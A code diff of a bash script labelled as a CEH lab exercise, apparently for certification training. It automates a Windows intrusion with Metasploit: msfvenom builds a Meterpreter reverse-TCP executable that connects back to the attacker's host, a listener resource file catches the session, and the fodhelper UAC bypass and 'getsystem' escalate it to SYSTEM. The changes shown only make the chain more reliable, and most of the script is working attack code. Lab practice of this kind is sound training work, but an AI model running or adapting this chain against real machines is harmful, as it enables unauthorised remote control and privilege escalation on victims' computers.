@@ -1,36 +1,36 @@
 #!/bin/bash
 
 # ==============================================================================
-# CEH Lab 2: UAC Bypass & Privilege Escalation Orchestrator
+# CEH Lab 2: UAC Bypass & Privilege Escalation (Reliability Version)
 # ==============================================================================
 
-# 1. Root Check with proper exit status
-if [[ "$EUID" -ne 0 ]]; then
-    echo "[ERROR] This script must be run as root (sudo su)." >&2
+# Ensure the script is run as root
+if [[ "$EUID" -ne 0 ]]; then 
+    echo "[ERROR] Please run as root (sudo su)" >&2
     exit 1
 fi
 
-# 2. Prerequisite Check
-REQUIRED_CMDS=("msfvenom" "msfconsole" "realpath")
-for cmd in "${REQUIRED_CMDS[@]}"; do
-    if ! command -v "$cmd" &> /dev/null; then
-        echo "[ERROR] Required command '$cmd' is not installed. Aborting." >&2
-        exit 1
-    fi
-done
-
 echo "--- Lab 2 Configuration ---"
 
-# 3. Input Validation
+# 1. FIX: Robust IP Validation using Python
 while true; do
     read -p "Enter Attacker IP (LHOST): " LHOST
-    if [[ $LHOST =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+    if python3 - "$LHOST" <<'PY'
+import ipaddress, sys
+try:
+    ipaddress.IPv4Address(sys.argv[1])
+    sys.exit(0)
+except ValueError:
+    sys.exit(1)
+PY
+    then
         break
     else
-        echo "[!] Invalid IPv4 format. Please try again."
+        echo "[!] Invalid IPv4 address (e.g., 10.10.1.13). Please try again."
     fi
 done
 
+# Port Validation
 while true; do
     read -p "Enter Attacker Port (LPORT): " LPORT
     if [[ $LPORT =~ ^[0-9]+$ ]] && [ "$LPORT" -ge 1 ] && [ "$LPORT" -le 65535 ]; then
@@ -45,30 +45,31 @@ EXE_PATH="/home/attacker/Desktop/Windows.exe"
 HANDLER_RC="handler.rc"
 ESCALATE_RC="escalate.rc"
 
-# 4. Payload Generation with strict validation
-echo -e "\n[*] Generating Windows Payload..."
-# Remove old file to ensure we aren't reporting a "false positive" existence
-rm -f "$EXE_PATH"
+# 2. FIX: Check output directory before generating the file
+mkdir -p /home/attacker/Desktop || 
+    { echo "[ERROR] Cannot create output directory."; exit 1; }
 
+[[ -w /home/attacker/Desktop ]] || 
+    { echo "[ERROR] Output directory is not writable."; exit 1; }
+
+# Payload Generation
+echo -e "\n[*] Generating Windows Payload..."
+rm -f "$EXE_PATH" # Ensure a fresh file
 if msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > "$EXE_PATH"; then
-    # Verify the file is not empty
     if [ -s "$EXE_PATH" ]; then
-        FULL_PATH=$(realpath "$EXE_PATH")
         echo "[+] SUCCESS: Payload generated."
-        echo "[!] LOCATION: $FULL_PATH"
+        echo "[!] FILE LOCATION: $(realpath "$EXE_PATH")"
     else
-        echo "[ERROR] Payload file was created but is empty." >&2
+        echo "[ERROR] Payload file is empty." >&2
         exit 1
     fi
 else
-    echo "[ERROR] msfvenom failed to generate the payload." >&2
+    echo "[ERROR] msfvenom failed." >&2
     exit 1
 fi
 
-# 5. Resource File Creation
+# Resource File Creation
 echo "[*] Creating Metasploit resource files..."
-
-# Handler RC: Starts the listener
 cat <<EOF > "$HANDLER_RC"
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
@@ -78,39 +79,47 @@ set ExitOnSession false
 run -j
 EOF
 
-# Escalation RC: Performs the UAC Bypass
-# Note: We use a variable for the session ID which the user will verify
 cat <<EOF > "$ESCALATE_RC"
-# This script assumes the session is already active
-# Replace '1' with the actual session ID if different
-set SESSION_ID 1 
+# This is a template; the session ID will be handled in the final step
 use exploit/windows/local/bypassuac_fodhelper
-set session \$SESSION_ID
 set LHOST $LHOST
 set TARGET 0
 exploit
 EOF
 
+# 4. FIX: Check that resource files were actually created and not empty
+[[ -s "$HANDLER_RC" ]] || 
+    { echo "[ERROR] Handler resource file is missing or empty."; exit 1; }
+
+[[ -s "$ESCALATE_RC" ]] || 
+    { echo "[ERROR] Escalation resource file is missing or empty."; exit 1; }
+
 echo -e "\n===================================================================="
 echo "STAGE 1: ESTABLISHING CONNECTION"
 echo "1. Transfer the file to the target: $EXE_PATH"
-echo "2. Launching Metasploit Listener now..."
+echo "2. Execute the file on the Windows 11 machine."
 echo "===================================================================="
-sleep 2
 
-# Launch Metasploit
+# 3. FIX: Make the Metasploit pause explicit
+echo "[INFO] Metasploit is now running in the foreground."
+echo "[INFO] Bash will continue only after Metasploit exits."
 msfconsole -r "$HANDLER_RC"
+msf_status=$?
+echo "[INFO] Metasploit exited with status: $msf_status"
 
-# The script will pause here while msfconsole is running.
-# Once the user exits msfconsole or backgrounds it:
-
-echo -e "\n\n===================================================================="
+echo -e "\n===================================================================="
 echo "STAGE 2: PRIVILEGE ESCALATION"
-echo "Check your active sessions: 'sessions -l'"
-read -p "Enter the Session ID to escalate (default 1): " SID
-SID=${SID:-1}
 
-# We create a temporary RC for the specific session ID chosen
+# 5. FIX: Correct the session-ID assumption (Verify state instead of assuming 1)
+echo "[*] Please check your active sessions in Metasploit using 'sessions -l'"
+read -p "Enter the active Session ID you wish to escalate: " SID
+
+if [[ -z "$SID" ]]; then
+    echo "[ERROR] Session ID cannot be empty."
+    exit 1
+fi
+
+# Create a temporary RC for the specific validated session
 cat <<EOF > "temp_esc.rc"
 use exploit/windows/local/bypassuac_fodhelper
 set session $SID
@@ -122,7 +131,7 @@ EOF
 echo "[*] Launching Escalation for Session $SID..."
 msfconsole -r "temp_esc.rc"
 
-echo -e "\n[!] FINAL STEP: Inside the new Meterpreter session, type:"
+echo -e "\n[!] FINAL STEP: Once the new session opens, manually run:"
 echo "    getsystem -t 1"
 echo "    getuid"
 echo "===================================================================="
